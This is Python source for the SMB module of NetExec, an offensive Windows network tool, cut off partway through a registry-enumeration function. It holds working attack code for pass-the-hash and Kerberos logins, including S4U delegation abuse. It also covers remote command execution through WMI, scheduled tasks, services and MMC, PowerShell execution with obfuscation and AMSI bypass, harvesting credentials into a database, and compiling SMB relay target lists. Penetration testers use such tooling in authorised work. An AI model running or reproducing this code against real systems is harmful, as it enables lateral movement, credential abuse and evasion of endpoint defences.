import ntpath
import binascii
import os
import re
from io import StringIO
from Cryptodome.Hash import MD4

from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.examples.secretsdump import (
    RemoteOperations,
    SAMHashes,
    LSASecrets,
    NTDSHashes,
)
from impacket.nmb import NetBIOSError, NetBIOSTimeout
from impacket.dcerpc.v5 import transport, lsat, lsad, scmr, rrp
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.krb5.kerberosv5 import SessionKeyDecryptionError
from impacket.krb5.types import KerberosException, Principal
from impacket.krb5 import constants
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
from impacket.smb3structs import FILE_SHARE_WRITE, FILE_SHARE_DELETE

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
from nxc.helpers.misc import gen_random_string, validate_ntlm
from nxc.logger import NXCAdapter
from nxc.protocols.smb.firefox import FirefoxTriage
from nxc.protocols.smb.kerberos import kerberos_login_with_S4U
from nxc.servers.smb import NXCSMBServer
from nxc.protocols.smb.wmiexec import WMIEXEC
from nxc.protocols.smb.atexec import TSCH_EXEC
from nxc.protocols.smb.smbexec import SMBEXEC
from nxc.protocols.smb.mmcexec import MMCEXEC
from nxc.protocols.smb.smbspider import SMBSpider
from nxc.protocols.smb.passpol import PassPolDump
from nxc.protocols.smb.samruser import UserSamrDump
from nxc.protocols.smb.samrfunc import SamrFunc
from nxc.protocols.smb.raw_ntds_copy import RawNTDSCopy
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.helpers.logger import highlight
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.powershell import create_ps_command

from dploot.triage.vaults import VaultsTriage
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.backupkey import BackupkeyTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.sccm import SCCMTriage

from pywerview.cli.helpers import get_localdisks, get_netsession, get_netgroupmember, get_netgroup, get_netcomputer, get_netloggedon, get_netlocalgroup

from time import time
from datetime import datetime
from functools import wraps
from traceback import format_exc
import logging
from termcolor import colored
import contextlib

smb_share_name = gen_random_string(5).upper()
smb_server = None

smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED",
    "STATUS_NO_SUCH_FILE",
    "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED",
]


def get_error_string(exception):
    if hasattr(exception, "getErrorString"):
        try:
            es = exception.getErrorString()
        except KeyError:
            return f"Could not get nt error code {exception.getErrorCode()} from impacket: {exception}"
        if type(es) is tuple:
            return es[0]
        else:
            return es
    else:
        return str(exception)


def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        with contextlib.suppress(IndexError):
            payload = args[0]
        with contextlib.suppress(IndexError):
            get_output = args[1]
        with contextlib.suppress(IndexError):
            methods = args[2]

        if "payload" in kwargs:
            payload = kwargs["payload"]
        if "get_output" in kwargs:
            get_output = kwargs["get_output"]
        if "methods" in kwargs:
            methods = kwargs["methods"]
        if not payload and self.args.execute and not self.args.no_output:
            get_output = True
        if (get_output or (methods and ("smbexec" in methods))) and not smb_server:
            self.logger.debug("Starting SMB server")
            smb_server = NXCSMBServer(
                self.nxc_logger,
                smb_share_name,
                listen_port=self.args.smb_server_port,
                verbose=self.args.verbose,
            )
            smb_server.start()

        output = func(self, *args, **kwargs)
        if smb_server is not None:
            smb_server.shutdown()
            smb_server = None
        return output

    return wraps(func)(_decorator)


class smb(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.server_os_major = None
        self.server_os_minor = None
        self.server_os_build = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ""
        self.nthash = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name
        self.pvkbytes = None
        self.no_da = None
        self.no_ntlm = False
        self.protocol = "SMB"
        self.is_guest = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "SMB",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def get_os_arch(self):
        try:
            string_binding = rf"ncacn_ip_tcp:{self.host}[135]"
            transport = DCERPCTransportFactory(string_binding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(
                    MSRPC_UUID_PORTMAP,
                    transfer_syntax=("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0"),
                )
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except Exception as e:
            self.logger.debug(f"Error retrieving os arch of {self.host}: {e!s}")

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login("", "")
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
        except Exception as e:
            if "STATUS_NOT_SUPPORTED" in str(e):
                # no ntlm supported
                self.no_ntlm = True
                self.logger.debug("NTLM not supported")

        # self.domain is the attribute we authenticate with
        # self.targetDomain is the attribute which gets displayed as host domain
        if not self.no_ntlm:
            self.hostname = self.conn.getServerName()
            self.targetDomain = self.conn.getServerDNSDomainName()
            if not self.targetDomain:   # Not sure if that can even happen but now we are safe
                self.targetDomain = self.hostname
        else:
            # If we can't authenticate with NTLM and the target is supplied as a FQDN we must parse it
            try:
                import socket
                socket.inet_aton(self.host)
                self.logger.debug("NTLM authentication not available! Authentication will fail without a valid hostname and domain name")
                self.hostname = self.host
                self.targetDomain = self.host
            except OSError:
                if self.host.count(".") >= 1:
                    self.hostname = self.host.split(".")[0]
                    self.targetDomain = ".".join(self.host.split(".")[1:])
                else:
                    self.hostname = self.host
                    self.targetDomain = self.host

        self.domain = self.targetDomain if not self.args.domain else self.args.domain

        if self.args.local_auth:
            self.domain = self.hostname
            self.targetDomain = self.hostname

        # As of June 2024 Samba will always report the version as "Windows 6.1", apparently due to a bug https://stackoverflow.com/a/67577401/17395725
        # Together with the reported build version "0" by Samba we can assume that it is a Samba server. Windows should always report a build version > 0
        # Also only on Windows we should get an OS arch as for that we would need MSRPC
        try:
            self.server_os = self.conn.getServerOS()
            self.server_os_major = self.conn.getServerOSMajor()
            self.server_os_minor = self.conn.getServerOSMinor()
            self.server_os_build = self.conn.getServerOSBuild()
        except KeyError:
            self.logger.debug("Error getting server information...")

        if "Windows 6.1" in self.server_os and self.server_os_build == 0 and self.os_arch == 0:
            self.server_os = "Unix - Samba"
        elif self.server_os_build == 0 and self.os_arch == 0:
            self.server_os = "Unix"
        self.logger.debug(f"Server OS: {self.server_os} {self.server_os_major}.{self.server_os_minor} build {self.server_os_build}")

        self.logger.extra["hostname"] = self.hostname

        if isinstance(self.server_os.lower(), bytes):
            self.server_os = self.server_os.decode("utf-8")

        try:
            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection["RequireSigning"]
        except Exception as e:
            self.logger.debug(e)

        self.os_arch = self.get_os_arch()
        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

        try:
            self.db.add_host(
                self.host,
                self.hostname,
                self.domain,
                self.server_os,
                self.smbv1,
                self.signing,
            )
        except Exception as e:
            self.logger.debug(f"Error adding host {self.host} into db: {e!s}")

        try:
            # DCs seem to want us to logoff first, windows workstations sometimes reset the connection
            self.conn.logoff()
        except Exception as e:
            self.logger.debug(f"Error logging off system: {e}")

        # DCOM connection with kerberos needed
        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.domain}"

        if not self.kdcHost and self.domain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

        # If we want to authenticate we should create another connection object, because we already logged in
        if self.args.username or self.args.cred_id or self.kerberos or self.args.use_kcache:
            self.create_conn_obj()

    def print_host_info(self):
        signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=["bold"]) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=["bold"])
        smbv1 = colored(f"SMBv1:{self.smbv1}", host_info_colors[2], attrs=["bold"]) if self.smbv1 else colored(f"SMBv1:{self.smbv1}", host_info_colors[3], attrs=["bold"])
        self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.targetDomain}) ({signing}) ({smbv1})")
        return True

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.logger.debug(f"KDC set to: {kdcHost}")
        lmhash = ""
        nthash = ""

        try:
            self.password = password
            self.username = username
            # This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
                self.hash = nthash
            else:
                nthash = ntlm_hash
                self.hash = ntlm_hash
            if lmhash:
                self.lmhash = lmhash
            if nthash:
                self.nthash = nthash

            if not all(s == "" for s in [self.nthash, password, aesKey]):
                kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
            else:
                kerb_pass = ""
                self.logger.debug(f"Attempting to do Kerberos Login with useCache: {useCache}")

            tgs = None
            if self.args.delegate:
                kerb_pass = ""
                self.username = self.args.delegate
                serverName = Principal(f"cifs/{self.hostname}", type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)
                self.logger.debug(f"Got TGS for {self.args.delegate} through S4U")

            self.conn.kerberosLogin(self.username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache, TGS=tgs)
            if "Unix" not in self.server_os:
                self.check_if_admin()

            if username == "":
                self.username = self.conn.getCredentials()[0]
            elif not self.args.delegate:
                self.username = username

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"

            out = f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "" and not self.args.delegate:
                add_user_bh(self.username, domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
                self.create_conn_obj()
            return True
        except SessionKeyDecryptionError:
            # success for now, since it's a vulnerability - previously was an error
            self.logger.success(
                f"{domain}\\{self.username} account vulnerable to asreproast attack",
                color="yellow",
            )
            return False
        except (FileNotFoundError, KerberosException) as e:
            self.logger.fail(f"CCache Error: {e}")
            return False
        except OSError as e:
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"
            self.logger.fail(f"{domain}\\{self.username}{used_ccache} {e}")
        except (SessionError, Exception) as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"
            self.logger.fail(
                f"{domain}\\{self.username}{used_ccache} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
            return False

    def plaintext_login(self, domain, username, password):
        # Re-connect since we logged off
        try:
            self.password = password
            self.username = username
            self.domain = domain

            self.conn.login(self.username, self.password, domain)
            self.logger.debug(f"Logged in with password to SMB with {domain}/{self.username}")
            self.is_guest = bool(self.conn.isGuestSession())
            self.logger.debug(f"{self.is_guest=}")
            if "Unix" not in self.server_os:
                self.check_if_admin()

            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_guest()}{self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                self.logger.debug(f"Adding admin user: {self.domain}/{self.username}:{self.password}@{self.host}")
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
                self.create_conn_obj()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f'{domain}\\{self.username}:{process_secret(self.password)} {error} {f"({desc})" if self.args.verbose else ""}',
                color="magenta" if error in smb_error_status else "red",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            self.create_conn_obj()
            return False
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
            self.create_conn_obj()
            return False

    def hash_login(self, domain, username, ntlm_hash):
        # Re-connect since we logged off
        lmhash = ""
        nthash = ""
        try:
            self.domain = domain
            self.username = username
            # This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
                self.hash = nthash
            else:
                nthash = ntlm_hash
                self.hash = ntlm_hash
            if lmhash:
                self.lmhash = lmhash
            if nthash:
                self.nthash = nthash

            self.conn.login(self.username, "", domain, lmhash, nthash)
            self.logger.debug(f"Logged in with hash to SMB with {domain}/{self.username}")
            self.is_guest = bool(self.conn.isGuestSession())
            self.logger.debug(f"{self.is_guest=}")
            if "Unix" not in self.server_os:
                self.check_if_admin()

            self.db.add_credential("hash", domain, self.username, self.hash)
            user_id = self.db.get_credential("hash", domain, self.username, self.hash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            out = f"{domain}\\{self.username}:{process_secret(self.hash)} {self.mark_guest()}{self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
                self.create_conn_obj()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f"{domain}\\{self.username}:{process_secret(self.hash)} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )

            if error not in smb_error_status:
                self.inc_failed_login(self.username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            self.create_conn_obj()
            return False
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
            self.create_conn_obj()
            return False

    def create_smbv1_conn(self):
        self.logger.debug(f"Creating SMBv1 connection to {self.host}")
        try:
            self.conn = SMBConnection(
                self.remoteName,
                self.host,
                None,
                self.port,
                preferredDialect=SMB_DIALECT,
                timeout=self.args.smb_timeout,
            )
            self.smbv1 = True
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                self.logger.info(f"SMBv1 might be disabled on {self.host}")
            return False
        except (Exception, NetBIOSTimeout) as e:
            self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
            return False
        return True

    def create_smbv3_conn(self):
        self.logger.debug(f"Creating SMBv3 connection to {self.host}")
        try:
            self.conn = SMBConnection(
                self.remoteName,
                self.host,
                None,
                self.port,
                timeout=self.args.smb_timeout,
            )
            self.smbv1 = False
        except OSError as e:
            # This should not happen anymore!!!
            if str(e).find("Too many open files") != -1:
                if not self.logger:
                    print("DEBUG ERROR: logger not set, please open an issue on github: " + str(self) + str(self.logger))
                    self.proto_logger()
                self.logger.fail(f"SMBv3 connection error on {self.host}: {e}")
            return False
        except (Exception, NetBIOSTimeout) as e:
            self.logger.info(f"Error creating SMBv3 connection to {self.host}: {e}")
            return False
        return True

    def create_conn_obj(self, no_smbv1=False):
        """
        Tries to create a connection object to the target host.
        On first try, it will try to create a SMBv1 connection.
        On further tries, it will remember which SMB version is supported and create a connection object accordingly.

        :param no_smbv1: If True, it will not try to create a SMBv1 connection
        """
        # Initial negotiation
        if not no_smbv1 and self.smbv1 is None:
            self.smbv1 = self.create_smbv1_conn()
            if self.smbv1:
                return True
            else:
                return self.create_smbv3_conn()
        elif not no_smbv1 and self.smbv1:
            return self.create_smbv1_conn()
        else:
            return self.create_smbv3_conn()

    def check_if_admin(self):
        self.logger.debug(f"Checking if user is admin on {self.host}")
        rpctransport = SMBTransport(self.conn.getRemoteHost(), 445, r"\svcctl", smb_connection=self.conn)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception:
            self.admin_privs = False
        else:
            with contextlib.suppress(Exception):
                dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                scmrobj = scmr.hROpenSCManagerW(dce, f"{self.host}\x00", "ServicesActive\x00", 0xF003F)
                scmr.hREnumServicesStatusW(dce, scmrobj["lpScHandle"])
                self.logger.debug(f"User is admin on {self.host}!")
                self.admin_privs = True
            except scmr.DCERPCException:
                self.admin_privs = False
            except Exception as e:
                self.logger.fail(f"Error checking if user is admin on {self.host}: {e}")
                self.admin_privs = False

    def gen_relay_list(self):
        if self.server_os.lower().find("windows") != -1 and self.signing is False:
            with sem, open(self.args.gen_relay_list, "a+") as relay_list:
                if self.host not in relay_list.read():
                    relay_list.write(self.host + "\n")

    @requires_admin
    def execute(self, payload=None, get_output=False, methods=None):
        if self.args.exec_method:
            methods = [self.args.exec_method]
        if not methods:
            methods = ["wmiexec", "atexec", "smbexec", "mmcexec"]

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output:
                get_output = True

        current_method = ""
        for method in methods:
            current_method = method
            if method == "wmiexec":
                try:
                    exec_method = WMIEXEC(
                        self.remoteName,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.host,
                        self.hash,
                        self.args.share,
                        logger=self.logger,
                        timeout=self.args.dcom_timeout,
                        tries=self.args.get_output_tries
                    )
                    self.logger.info("Executed command via wmiexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via wmiexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "mmcexec":
                try:
                    # https://github.com/fortra/impacket/issues/1611
                    if self.kerberos:
                        raise Exception("MMCExec current is buggly with kerberos")
                    exec_method = MMCEXEC(
                        self.remoteName,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.host,
                        self.hash,
                        self.args.share,
                        logger=self.logger,
                        timeout=self.args.dcom_timeout,
                        tries=self.args.get_output_tries
                    )
                    self.logger.info("Executed command via mmcexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via mmcexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "atexec":
                try:
                    exec_method = TSCH_EXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.host,
                        self.kdcHost,
                        self.hash,
                        self.logger,
                        self.args.get_output_tries,
                        self.args.share
                    )
                    self.logger.info("Executed command via atexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via atexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "smbexec":
                try:
                    exec_method = SMBEXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.conn,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.host,
                        self.kdcHost,
                        self.hash,
                        self.args.share,
                        self.port,
                        self.logger,
                        self.args.get_output_tries
                    )
                    self.logger.info("Executed command via smbexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via smbexec, traceback:")
                    self.logger.debug(format_exc())
                    continue

        if hasattr(self, "server"):
            self.server.track_host(self.host)

        if "exec_method" in locals():
            output = exec_method.execute(payload, get_output)
            try:
                if not isinstance(output, str):
                    output = output.decode(self.args.codec)
            except UnicodeDecodeError:
                self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
                output = output.decode("cp437")

            self.logger.debug(f"Raw Output: {output}")
            output = "\n".join([ll.rstrip() for ll in output.splitlines() if ll.strip()])
            self.logger.debug(f"Cleaned Output: {output}")

            if "This script contains malicious content" in output:
                self.logger.fail("Command execution blocked by AMSI")
                return None

            if (self.args.execute or self.args.ps_execute):
                self.logger.success(f"Executed command via {current_method}")
                if output:
                    output_lines = StringIO(output).readlines()
                    for line in output_lines:
                        self.logger.highlight(line.strip())
            return output
        else:
            self.logger.fail(f"Execute command failed with {current_method}")
            return False

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, obfs=False, encode=False):
        payload = self.args.ps_execute if not payload and self.args.ps_execute else payload
        if not payload:
            self.logger.error("No command to execute specified!")
            return None

        response = []
        obfs = obfs if obfs else self.args.obfs
        encode = encode if encode else not self.args.no_encode
        force_ps32 = force_ps32 if force_ps32 else self.args.force_ps32
        get_output = True if not self.args.no_output else get_output

        self.logger.debug(f"Starting ps_execute(): {payload=} {get_output=} {methods=} {force_ps32=} {obfs=} {encode=}")
        amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None
        self.logger.debug(f"AMSI Bypass: {amsi_bypass}")

        if os.path.isfile(payload):
            self.logger.debug(f"File payload set: {payload}")
            with open(payload) as commands:
                response = [self.execute(create_ps_command(c.strip(), force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods) for c in commands]
        else:
            response = [self.execute(create_ps_command(payload, force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods)]

        self.logger.debug(f"ps_execute response: {response}")
        return response

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        temp_file = ntpath.normpath("\\" + gen_random_string() + ".txt")
        permissions = []

        try:
            self.logger.debug(f"domain: {self.domain}")
            user_id = self.db.get_user(self.domain.upper(), self.username)[0][0]
        except IndexError as e:
            if self.kerberos:
                pass
            else:
                self.logger.fail(f"IndexError: {e!s}")
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(f"Error getting user: {error}")

        try:
            shares = self.conn.listShares()
            self.logger.info(f"Shares returned: {shares}")
        except SessionError as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions

        for share in shares:
            share_name = share["shi1_netname"][:-1]
            share_remark = share["shi1_remark"][:-1]
            share_info = {"name": share_name, "remark": share_remark, "access": []}
            read = False
            write = False
            write_dir = False
            write_file = False
            try:
                self.conn.listPath(share_name, "*")
                read = True
                share_info["access"].append("READ")
            except SessionError as e:
                error = get_error_string(e)
                self.logger.debug(f"Error checking READ access on share {share_name}: {error}")

            if not self.args.no_write_check:
                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    write_dir = True
                    try:
                        self.conn.deleteDirectory(share_name, temp_dir)
                    except SessionError as e:
                        error = get_error_string(e)
                        if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                            pass
                        else:
                            self.logger.debug(f"Error DELETING created temp dir {temp_dir} on share {share_name}: {error}")
                except SessionError as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error checking WRITE access on share {share_name}: {error}")

                try:
                    tid = self.conn.connectTree(share_name)
                    fid = self.conn.createFile(tid, temp_file, desiredAccess=FILE_SHARE_WRITE, shareMode=FILE_SHARE_DELETE)
                    self.conn.closeFile(tid, fid)
                    write_file = True
                    try:
                        self.conn.deleteFile(share_name, temp_file)
                    except SessionError as e:
                        error = get_error_string(e)
                        if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                            pass
                        else:
                            self.logger.debug(f"Error DELETING created temp file {temp_file} on share {share_name}")
                except SessionError as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error checking WRITE access with file on share {share_name}: {error}")

                # If we either can create a file or a directory we add the write privs to the output. Agreed on in https://github.com/Pennyw0rth/NetExec/pull/404
                if write_dir or write_file:
                    write = True
                    share_info["access"].append("WRITE")

            permissions.append(share_info)

            if share_name != "IPC$":
                try:
                    # TODO: check if this already exists in DB before adding
                    self.db.add_share(self.hostname, user_id, share_name, share_remark, read, write)
                except Exception as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error adding share: {error}")

        self.logger.display("Enumerated shares")
        self.logger.highlight(f"{'Share':<15} {'Permissions':<15} {'Remark'}")
        self.logger.highlight(f"{'-----':<15} {'-----------':<15} {'------'}")
        for share in permissions:
            name = share["name"]
            remark = share["remark"]
            perms = share["access"]
            if self.args.filter_shares and not any(x in perms for x in self.args.filter_shares):
                continue
            self.logger.highlight(f"{name:<15} {','.join(perms):<15} {remark}")
        return permissions

    @requires_admin
    def interfaces(self):
        """
        Retrieve the list of network interfaces info (Name, IP Address, Subnet Mask, Default Gateway) from remote Windows registry'
        Made by: @Sant0rryu, @NeffIsBack
        """
        try:
            remoteOps = RemoteOperations(self.conn, False)
            remoteOps.enableRegistry()

            if remoteOps._RemoteOperations__rrp:
                reg_handle = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)["phKey"]
                key_handle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, reg_handle, "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces")["phkResult"]
                sub_key_list = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
                sub_keys = [rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, key_handle, i)["lpNameOut"][:-1] for i in range(sub_key_list)]

                self.logger.highlight(f"{'-Name-':<11} | {'-IP Address-':<15} | {'-SubnetMask-':<15} | {'-Gateway-':<15} | -DHCP-")
                for sub_key in sub_keys:
                    interface = {}
                    try:
                        interface_key = f"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\{sub_key}"
                        interface_handle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, reg_handle, interface_key)["phkResult"]

                        # Retrieve Interace Name
                        interface_name_key = f"SYSTEM\\ControlSet001\\Control\\Network\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\{sub_key}\\Connection"
                        interface_name_handle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, reg_handle, interface_name_key)["phkResult"]
                        interface_name = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, interface_name_handle, "Name")[1].rstrip("\x00")
                        interface["Name"] = str(interface_name)
                        if "Kernel" in interface_name:
                            continue

                        # Retrieve DHCP
                        try:
                            dhcp_enabled = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, interface_handle, "EnableDHCP")[1]
                        except DCERPCException:
                            dhcp_enabled = False
                        interface["DHCP"] = bool(dhcp_enabled)

                        # Retrieve IPAddress
                        try:
                            ip_address = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, interface_handle, "DhcpIPAddress" if dhcp_enabled else "IPAddress")[1].rstrip("\x00").replace("\x00", ", ")
                        except DCERPCException:
                            ip_address = None
                        interface["IPAddress"] = ip_address if ip_address else None

                        # Retrieve SubnetMask
                        try:
                            subnetmask = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, interface_handle, "SubnetMask")[1].rstrip("\x00").replace("\x00", ", ")
                        except DCERPCException:
